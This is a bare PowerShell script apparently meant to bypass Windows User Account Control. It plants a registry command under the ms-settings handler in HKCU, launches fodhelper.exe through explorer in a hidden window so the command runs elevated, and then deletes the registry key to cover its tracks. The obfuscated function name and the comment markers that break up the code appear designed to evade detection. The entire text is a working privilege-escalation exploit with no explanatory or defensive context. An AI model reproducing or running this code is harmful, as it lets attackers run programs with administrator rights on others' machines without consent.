function doedatding {
    Param (
        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe"
    )

    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    $exoticCode = @"
        New-Item -Path "$regPath" -Force | Out-Null
        <##>
        New-ItemProperty -Path "$regPath" -Name "DelegateExecute" -Value "" -Force | Out-Null
        <##>
        Set-ItemProperty -Path "$regPath" -Name "(default)" -Value "$program" -Force | Out-Null
"@


    & ([ScriptBlock]::Create($exoticCode))

    Start-Process "C:\Windows\explorer.exe" -ArgumentList "/root,C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    Start-Sleep -Seconds 4

    Remove-Item -Path "$regPath" -Recurse -Force -ErrorAction SilentlyContinue
}